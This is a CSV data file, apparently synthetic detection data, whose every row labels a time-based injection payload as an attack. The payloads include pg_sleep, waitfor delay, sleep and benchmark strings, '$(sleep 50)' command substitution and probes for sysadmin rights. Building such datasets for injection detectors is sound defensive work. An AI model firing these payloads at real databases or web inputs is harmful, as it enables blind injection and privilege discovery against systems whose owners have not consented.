id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000444,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.129914755819909
CTGAN_000445,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.501563553172597
CTGAN_000446,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.061159485811785
CTGAN_000447,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.861011441294968
CTGAN_000448,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.923815212313703
CTGAN_000449,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.608485474005941
CTGAN_000450,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,7.604735019193121
CTGAN_000451,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.300740880432778
CTGAN_000452,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.319515415877331
CTGAN_000453,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.753832220802146
CTGAN_000454,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.813654047157673
CTGAN_000455,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.134330386068755
CTGAN_000456,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.141885689120469
CTGAN_000457,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,6.986823157223807
CTGAN_000458,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.298563646891818
CTGAN_000459,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.389552962071945
CTGAN_000460,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.944798794006883
CTGAN_000461,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,6.570545038232887
CTGAN_000462,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.5257343737042275
CTGAN_000463,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.19568401121514
CTGAN_000464,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.647078340404386
CTGAN_000465,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,7.092077047764291
CTGAN_000466,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.560713361507381
CTGAN_000467,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,6.502291718308797
CTGAN_000468,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.399621082392746
CTGAN_000469,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,5.521290372901945
CTGAN_000470,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.1607849758757816
CTGAN_000471,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,7.160165035268665
CTGAN_000472,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.070149205689857
CTGAN_000473,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,6.799235508299099
CTGAN_000474,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.946815783816607
CTGAN_000475,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.036995069967163
CTGAN_000476,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,7.265687333278476
CTGAN_000477,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.188440921946482
CTGAN_000478,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.463762477275135
CTGAN_000479,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.733082766447083
CTGAN_000480,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.7474206219681525
CTGAN_000481,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.835447141642774
CTGAN_000482,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,7.106412289147064
CTGAN_000483,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,7.701568840288961
CTGAN_000484,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.3850982567567405
CTGAN_000485,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.7607802829573345
CTGAN_000486,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.627750162721882
CTGAN_000487,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.265075327229924
CTGAN_000488,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.665604565260084
CTGAN_000489,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,8.458512775459909
CTGAN_000490,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.387514019579292
CTGAN_000491,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.594303087430214
CTGAN_000492,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.130093807627294
CTGAN_000493,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.498816218527344
CTGAN_000494,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.597440607418122
CTGAN_000495,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.680069546449101
CTGAN_000496,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.04875117698991
CTGAN_000497,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.581281239727137
CTGAN_000498,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.714459028791293
CTGAN_000499,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.035603919736347
CTGAN_000500,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.399532190985235
